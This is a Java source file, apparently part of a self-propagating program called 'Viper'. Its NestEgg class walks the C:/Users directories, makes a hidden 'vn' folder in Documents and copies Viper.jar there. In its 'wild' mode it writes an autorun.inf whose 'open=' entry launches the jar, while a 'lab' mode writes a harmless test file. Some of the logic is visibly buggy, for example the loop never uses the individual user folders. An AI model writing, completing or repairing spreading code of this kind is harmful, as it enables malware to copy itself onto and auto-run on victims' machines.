package propogartion;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

import communication.Identification;

public class NestEgg {
	static String[] inCodedL= {"testing","testing","testing"};
	static String[] inCodedW= {"[autorun]","open="};
	static int unitCopys=0;
	static int unitNum;
	static String error ="";
public static void labEgg(Path vPath,int unitNumber){
	File users= new File("C:/Users");
	unitNum=unitNumber;
	File[] targetUsers = users.listFiles();
	for(int x =0; x<targetUsers.length;x++){
		String userCP=users.getAbsolutePath();
		try {
			 userCP=users.getCanonicalPath();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			error=error+" first canpath "+ e.getLocalizedMessage();
			e.printStackTrace();
		}
		String usePath= createFilePath(userCP,true);
		createCopy(usePath,vPath,true);
		copyMode(usePath);
		outError(vPath);
	}

}
public static void wildEgg(Path vPath,int unitNumber){
	File users= new File("C:/Users");
	unitNum=unitNumber;
	File[] targetUsers = users.listFiles();
	for(int x =0; x<targetUsers.length;x++){
		String userCP=users.getAbsolutePath();
		try {
			 userCP=users.getCanonicalPath();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		String usePath= createFilePath(userCP, false);
		createCopy(usePath,vPath,false);
		
	}
}
public static String createFilePath(String userPath, boolean lab){
	File doc= new File(userPath+"/Documents");
	if(doc.exists()==false){
		doc=new File(userPath+"/"+System.getProperty("user.name")+"/My Documents");
	}
	String docCP=doc.getAbsolutePath();
	try {
		docCP = doc.getCanonicalPath();
	} catch (IOException e1) {
		// TODO Auto-generated catch block
		error= error+ " canonicalPath1 "+e1.getLocalizedMessage();
		e1.printStackTrace();
	}
	File uP=new File(docCP+"/vn");
	if(uP.exists()==false){
		
			if( uP.mkdir()==true){
				error=error+" directory vn created ";
			}else{
				error=error+" directory vn not created ";
			}
		 
		
		
	}
	if(uP.isHidden()==false){
		
		try {
			
			Files.setAttribute(uP.toPath(),"dos:hidden", uP.isHidden(), LinkOption.NOFOLLOW_LINKS);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			error=error+" can't hide file "+e.getLocalizedMessage();
			e.printStackTrace();
		}
	}
	String uPCP=uP.getAbsolutePath();
	try {
		uPCP = uP.getCanonicalPath();
	} catch (IOException e) {
		// TODO Auto-generated catch block
		error= error+ " canonicalPath2 "+e.getLocalizedMessage();
		e.printStackTrace();
	}
	return uPCP ;
	
}
public static void createCopy(String filePath,Path vPath,boolean lab){
	File nestLocation=new File(filePath);
	Identification nVID=new Identification();
	File vLocation= new File(vPath.toString()+"/Viper.jar");
	File vTarget= new File(filePath+"/Viper.jar");
	try{
		
			   
		
		
		
		
			
		 if(!nestLocation.exists()){
			if( nestLocation.mkdir()==true){
				error=error+" directory vn created ";
			}else{
				error=error+" directory vn not created ";
			}
		 
		createAutoRun(lab,filePath);
		
		
		 }
		 }
		 catch(IOException e){
		 System.out.println( "Error: "+ e.toString());
		 }
	nVID.saveInfo(unitNum++, 0, nestLocation);
	try {
		File vF=new File(filePath+"/Viper.jar");
		if(vF.exists()==false){
			unitCopys++;
		
		
		Files.copy(vLocation.toPath() ,vTarget.toPath());
		}
	} catch (IOException e) {
		// TODO Auto-generated catch block
		error=error+" cant copy "+ e.getLocalizedMessage()+" ";
		e.printStackTrace();
	}

}
public static void copyMode(String filePath){
	File nestLocation= new File(filePath);
	File mode=new File(filePath+"/mode.txt");
	if(mode.exists()==false){
		try {
			mode.createNewFile();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}

public static int getUnitsCreated(){
	return unitCopys;
	
}
public static void outError(Path vPath){
	 
	File conf= new File(vPath+"/conf.txt");
	try{
	 if(conf.exists()==false){
		 conf.createNewFile();
	 }
	 FileWriter fw;
	 fw = new FileWriter(conf.getAbsolutePath());
	 BufferedWriter writing= new BufferedWriter(fw);
	
			writing.write(error);
			writing.newLine();
			 writing.close();
	 }
	 catch(IOException e){
	 System.out.println( "Error: "+ e.toString());
	 }
			
}
public static void createAutoRun(boolean lab, String filePath) throws IOException{
	FileWriter fw;
	if(lab==true){
	fw = new FileWriter(filePath+"/test.txt");
	}else{ fw= new FileWriter(filePath+"/autorun.inf");}
		BufferedWriter writing= new BufferedWriter(fw);
	
		if(lab==true){
		
	   for(int x=0;x<inCodedL.length; x++){
		writing.write(inCodedL[x]);
		writing.newLine();
		}
	    writing.close();
		}else if(lab==false){
			for(int x=0;x<inCodedW.length; x++){
				if(x==1){
				writing.write(inCodedW[x]+filePath+"/Viper.jar");
				}else{writing.write(inCodedW[x]);}
				writing.newLine();
				}
			    writing.close();	
		}
}
}
